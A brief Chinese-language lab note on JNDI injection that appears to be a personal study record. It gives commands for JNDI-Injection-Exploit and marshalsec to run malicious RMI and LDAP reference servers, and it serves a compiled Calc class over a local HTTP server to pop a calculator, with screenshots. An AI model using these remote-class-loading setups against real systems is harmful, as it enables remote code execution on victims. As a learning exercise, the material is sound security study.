# JNDI 漏洞

## rmi

<img src="images/image-20260206182816376.png" alt="image-20260206182816376" style="zoom:200%;" />

```
Java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "calc"
```

![image-20260206182836218](images/image-20260206182836218.png)

运行弹出计算器

![image-20260206182908556](images/image-20260206182908556.png)

## DNS

![image-20260206183409136](images/image-20260206183409136.png)

![image-20260206183417662](images/image-20260206183417662.png)

## ldap

跟 rmi同理







## marshalsec工具使用

创建脚本

![image-20260206201712989](images/image-20260206201712989.png)

编译成class  

```
javac .\Calc.java
```



![image-20260206201727732](images/image-20260206201727732.png)

在class文件目录下开启http 服务 端口 8888

```
python -m http.server 8888
```

打开工具

```
2、使用利用工具生成调用协议（rmi,ldap）
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://0.0.0.0/#Test
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://0.0.0.0/#Test
```

修改监听网址

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8888/#Calc
```

运行弹出记事本

![image-20260206202434092](images/image-20260206202434092.png)

![image-20260206202447959](images/image-20260206202447959.png)